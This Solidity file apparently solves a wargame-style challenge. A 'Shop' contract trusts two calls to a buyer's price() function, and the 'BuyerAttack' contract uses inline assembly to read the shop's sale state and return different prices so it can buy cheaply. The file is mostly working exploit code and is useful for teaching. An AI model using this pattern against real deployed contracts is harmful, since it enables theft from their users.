// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract BuyerAttack is Buyer {
    
    Shop s;
    
    constructor(address _address) public {
        s = Shop(_address);
    }
    
    function attack() external {
        s.buy();
    }
    
    function price() external view override returns (uint) {
        assembly {
            mstore(0x00, 0xe852e741)
            mstore(0x20, 0x0)
            let result := staticcall(gas(), sload(0x0), 0x1c, 0x4, 0x20, 0x20)
            if result {
               mstore(0x50, 0x64)
               return(0x50, 0x20) 
            }
            mstore(0x50, 0x0)
            return(0x50, 0x20)
        }
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
    
        if (_buyer.price{gas:3300}() >= price && !isSold) {
            isSold = true;
            price = _buyer.price{gas:3300}();
        }
    }
}